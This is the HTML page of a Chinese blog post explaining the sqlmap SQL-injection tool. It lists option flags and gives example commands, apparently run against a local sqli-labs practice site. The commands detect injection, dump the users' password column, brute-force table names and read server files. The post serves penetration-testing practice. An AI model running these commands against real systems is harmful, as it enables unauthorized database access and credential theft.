@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>SQLMAP用法 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SQLMAP用法"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SQLMAP用法
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/" class="article-date">
+  <time datetime="2022-03-10T01:56:28.000Z" itemprop="datePublished">2022-03-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/">内功心法</a> / <a class="article-category-link" href="/categories/%E5%86%85%E5%8A%9F%E5%BF%83%E6%B3%95/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="SQLMAP用法"><a href="#SQLMAP用法" class="headerlink" title="SQLMAP用法"></a>SQLMAP用法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap是一款基于python编写的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，在sql检测和利用方面功能强大，支持多种数据库</p>
+<h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">​                                          0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">​                                          1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">​                                          2：显示debug消息</span><br><span class="line"></span><br><span class="line">​                                          3：显示注入payload</span><br><span class="line"></span><br><span class="line">​                                          4：显示http请求</span><br><span class="line"></span><br><span class="line">​                                          5：显示http响应头·</span><br><span class="line"></span><br><span class="line">​                                          6：显示http响应内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="Target："><a href="#Target：" class="headerlink" title="Target："></a>Target：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br></pre></td></tr></table></figure>
+
+<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                            POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure>
+
+<p>​           </p>
+<h3 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Detectiong"><a href="#Detectiong" class="headerlink" title="Detectiong"></a>Detectiong</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Emuneration"><a href="#Emuneration" class="headerlink" title="Emuneration"></a>Emuneration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="File-system-access"><a href="#File-system-access" class="headerlink" title="File system access"></a>File system access</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="General"><a href="#General" class="headerlink" title="General"></a>General</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>–technique&#x3D;     （默认全部使用）</p>
+<p>B       基于布尔的盲注</p>
+<p>T       基于时间的盲注</p>
+<p>E      基于报错的注入</p>
+<p>U      基于UNION查询注入</p>
+<p>S      基于多语句查询注入</p>
+<h3 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h3><p><strong>1.指定目标url</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.从文件中获取多个url</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.从文件中加载HTTP请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.利用google获取目标</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.从burp日志中获取目标</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="实例演示-注入检测"><a href="#实例演示-注入检测" class="headerlink" title="实例演示-注入检测"></a>实例演示-注入检测</h3><p><strong>1.GET参数注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.POST参数注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>
+
+<p>如图，用 * 号指定cookie，这样就可以检测cookie。</p>
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183719226.png" class title="image-20220221183719226">
+
+<p><strong>4.user-agent注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>
+
+<p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p>
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183751119.png" class title="image-20220221183751119">
+
+
+
+
+
+<p><strong>5.referer注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>
+
+<p>如图，用 * 号指定referer，这样就可以检测referer。</p>
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183847549.png" class title="image-20220221183847549">
+
+
+
+<p><strong>6.host注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure>
+
+<p>如图，用 * 号指定host，这样就可以检测host。</p>
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184003961.png" class title="image-20220221184003961">
+
+
+
+<h3 id="实例演示-获取数据库信息"><a href="#实例演示-获取数据库信息" class="headerlink" title="实例演示-获取数据库信息"></a>实例演示-获取数据库信息</h3><p><strong>1.查看数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184417117.png" class title="image-20220221184417117">
+
+
+
+<p><strong>2.查看数据库里面的表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184338043.png" class title="image-20220221184338043">
+
+
+
+<p><strong>3.查看数据库表里面的列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users --columns   --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184320282.png" class title="image-20220221184320282">
+
+
+
+<p><strong>4.查看数据库列里面的具体的值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users -C password     --dump  --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184302447.png" class title="image-20220221184302447">
+
+
+
+<h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p>使用条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br></pre></td></tr></table></figure>
+
+<p><strong>暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</strong></p>
+<p><strong>1.暴力破解表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.暴力破解列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -T users --common-columns --batch</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="实例演示-读取文件-x2F-上传文件"><a href="#实例演示-读取文件-x2F-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
